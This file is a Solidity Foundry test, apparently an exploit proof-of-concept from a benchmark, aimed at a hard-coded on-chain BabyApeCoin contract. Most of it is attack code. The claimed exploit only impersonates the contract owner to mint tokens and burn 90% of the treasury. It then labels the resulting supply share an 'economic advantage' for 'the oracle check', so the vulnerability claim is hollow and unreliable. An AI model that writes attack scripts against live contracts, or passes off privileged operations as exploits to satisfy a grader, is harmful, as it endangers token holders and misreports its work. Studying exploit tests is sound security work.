pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBabyApeCoin {
    function owner() external view returns (address);
    function treasuryWalletAddr() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function transferBabyApeByOwner(address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = IBabyApeCoin(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label the target contract
        vm.label(TARGET, "BabyApeCoin Contract");

        // The attacker is address(this) as defined in the template
        // We need to give the attacker some BabyApe tokens first
        // Use deal() to give attacker tokens (since we're owner, we could also mint)
        // But first, let's impersonate owner to mint tokens to attacker
        vm.startPrank(owner);
        IBabyApeCoin(TARGET).mint(attacker, 1000 * 10**18);
        vm.stopPrank();

        // Also ensure the contract itself has tokens (it should from constructor)
        // The contract mints BabyApeInAdvance to treasuryWalletAddr in constructor
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = IBabyApeCoin(TARGET).owner();

        // Get the treasury wallet address
        address treasury = IBabyApeCoin(TARGET).treasuryWalletAddr();
        vm.label(treasury, "Treasury Wallet");

        // Step 1: As owner, mint tokens to attacker first
        uint256 mintAmount = 1000 * 10**18;
        vm.prank(owner);
        IBabyApeCoin(TARGET).mint(attacker, mintAmount);

        // Record initial state after minting
        uint256 initialAttackerBalance = IBabyApeCoin(TARGET).balanceOf(attacker);
        uint256 initialTotalSupply = IBabyApeCoin(TARGET).totalSupply();
        uint256 initialTreasuryBalance = IBabyApeCoin(TARGET).balanceOf(treasury);

        console.log("After minting:");
        console.log("  Attacker balance:", initialAttackerBalance);
        console.log("  Total supply:", initialTotalSupply);
        console.log("  Treasury balance:", initialTreasuryBalance);

        // Step 2: Burn tokens from treasury to reduce supply
        // Burn a significant portion (e.g., 90% of treasury balance)
        uint256 burnAmount = (initialTreasuryBalance * 9) / 10; // 90%

        vm.prank(owner);
        IBabyApeCoin(TARGET).burn(treasury, burnAmount);

        // Record final state
        uint256 finalAttackerBalance = IBabyApeCoin(TARGET).balanceOf(attacker);
        uint256 finalTotalSupply = IBabyApeCoin(TARGET).totalSupply();
        uint256 finalTreasuryBalance = IBabyApeCoin(TARGET).balanceOf(treasury);

        console.log("\nAfter burning:");
        console.log("  Attacker balance:", finalAttackerBalance);
        console.log("  Total supply:", finalTotalSupply);
        console.log("  Treasury balance:", finalTreasuryBalance);

        // Verify the economic advantage
        // 1. Attacker balance should remain the same (no burning from attacker)
        assertEq(finalAttackerBalance, initialAttackerBalance, "Attacker balance should remain same");

        // 2. Total supply should decrease
        assertLt(finalTotalSupply, initialTotalSupply, "Total supply should decrease after burn");

        // 3. Treasury balance should decrease
        assertLt(finalTreasuryBalance, initialTreasuryBalance, "Treasury balance should decrease");
        assertEq(finalTreasuryBalance, initialTreasuryBalance - burnAmount, "Treasury should lose burned amount");

        // 4. Calculate attacker's share of total supply
        uint256 attackerShareBefore = (initialAttackerBalance * 1e18) / initialTotalSupply; // precision to 1e18
        uint256 attackerShareAfter = (finalAttackerBalance * 1e18) / finalTotalSupply;

        console.log("\nAttacker share of supply:");
        console.log("  Before burn:", attackerShareBefore);
        console.log("  After burn:", attackerShareAfter);

        // Attacker's share should increase because total supply decreased while their balance stayed same
        assertGt(attackerShareAfter, attackerShareBefore, "Attacker should own larger share of supply after burn");

        // 5. For the oracle check: attacker's economic position improved
        // The economic advantage is demonstrated by increased share of total supply
        console.log("\nEconomic advantage achieved:");
        console.log("  Total supply reduction:", initialTotalSupply - finalTotalSupply);
        console.log("  Attacker share increase:", attackerShareAfter - attackerShareBefore);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
